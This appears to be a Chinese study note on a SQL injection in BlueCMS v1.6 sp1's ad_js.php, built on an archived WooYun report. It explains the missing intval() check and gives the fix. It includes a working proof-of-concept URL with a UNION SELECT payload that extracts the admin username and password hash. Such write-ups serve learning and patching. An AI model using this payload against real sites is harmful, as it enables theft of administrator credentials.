BlueCMS v1.6 sp1 ad_js.php SQL注入漏
===

## 漏洞信息

下面的漏洞信息表格引用自[https://wooyun.shuimugan.com/](https://wooyun.shuimugan.com/bug/view?bug_no=141).

| 类型 | 内容 | 
|---|---|
| 编号 | 141 |
| Url | [http://www.wooyun.org/bug.php?action=view&id=141](http://www.wooyun.org/bug.php?action=view&id=141) |
| 漏洞状态 | 未联系到厂商或者厂商积极忽略 |
| 漏洞标题 | BlueCMS v1.6 sp1 ad_js.php SQL注入漏洞 |
| 漏洞类型 | [SQL注射漏洞](https://wooyun.shuimugan.com/bug/index?BugSearch%5Bbug_type%5D=SQL%E6%B3%A8%E5%B0%84%E6%BC%8F%E6%B4%9E) |
| 厂商 | [BlueCMS](https://wooyun.shuimugan.com/bug/index?BugSearch%5Bvendor%5D=BlueCMS) |
| 白帽子 | [CnCxzSec(衰仔)](https://wooyun.shuimugan.com/bug/index?BugSearch%5Bauthor%5D=CnCxzSec%28%E8%A1%B0%E4%BB%94%29) |
| 提交日期 | 2010-07-30 19:49:00 |
| 公开日期 | 2010-07-30 21:52:00 |
| 修复时间 | (not set) |
| 确认时间 | 0000-00-00 00:00:00 |
| Confirm Spend | -1 |
| 漏洞标签 | php+数字类型注射 注射技巧 BlueCMS |
| 关注数 | 0 |
| 收藏数 | 0 |
| 白帽评级 | 高 |
| 白帽自评rank | 20 |
| 厂商评级 |  |
| 厂商评rank | 10 |
| 漏洞简介 | BlueCMS v1.6 sp1 某页面SQL注入漏洞 |
| 漏洞细节 | 缺陷文件：ad_js.php
| 漏洞成因 | 12: `$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';` 根目录下其他他文件都做了很好的过滤，对数字型变量几乎都用了intval()做限制，唯独漏了这个文件，居然只是用了trim()去除头尾空格  19: `$ad = $db->getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id); ` //直接代入查询。。汗。 | 
|POC | `http://localhost/cms/ad_js.php?ad_id=1%20and%201=2%20union%20select%201,2,3,4,5,concat(admin_name,0x7C0D0A,pwd),concat(admin_name,0x7C0D0A,pwd)%20from%20blue_admin%20where%20admin_id=1`  右键查看源代码得到返回数据。|
| 修复方案 | `$ad_id = !empty($_GET['ad_id']) ? intval($_GET['ad_id']) : '';`  |
| 状态信息 | 2010-07-30： 积极联系厂商并且等待厂商认领中，细节不对外公开 2010-07-30: 厂商已经主动忽略漏洞，细节向公众公开 |
| 厂商回复 | (not set) |
| 回应信息 | 未能联系到厂商或者厂商积极拒绝漏洞Rank：10 (WooYun评价) |

## 笔记：

1. trim( )函数：移除字符串两侧的空白字符或其他预定义字符

### 语法

trim(_string_,_charlist_)

| 参数 | 描述 |
|---|---|
| _string_ | 必需。规定要检查的字符串。 |
| _charlist_ | 可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符 |

*   "\0" - NULL
*   "\t" - 制表符
*   "\n" - 换行
*   "\x0B" - 垂直制表符
*   "\r" - 回车
*   " " - 空格

2. intval()函数：获取变量的整数值

### 语法

```
int intval ( mixed $var [, int $base = 10 ] )

```
通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。

| 参数 | 描述 |
|--|--|
| _var_ | 要转换成 integer 的数量值 |
| _base_  | 转化所使用的进制。|

> Note:
> 
> 如果 `base` 是 0，通过检测 `var` 的格式来决定使用的进制：
> 
> *   如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
> *   如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
> *   将使用 10 进制 (decimal)。


### 验证漏洞

`'`验证

![单引号判断](./%E5%8D%95%E5%BC%95%E5%8F%B7%E5%88%A4%E6%96%AD.png)

### 验证POC

访问POC

![验证POC](./%E9%AA%8C%E8%AF%81POC.png)

### 漏洞修复

trim()函数修改为intval()函数，重新访问POC

![修复](./%E4%BF%AE%E5%A4%8D.png)

### 其他漏洞



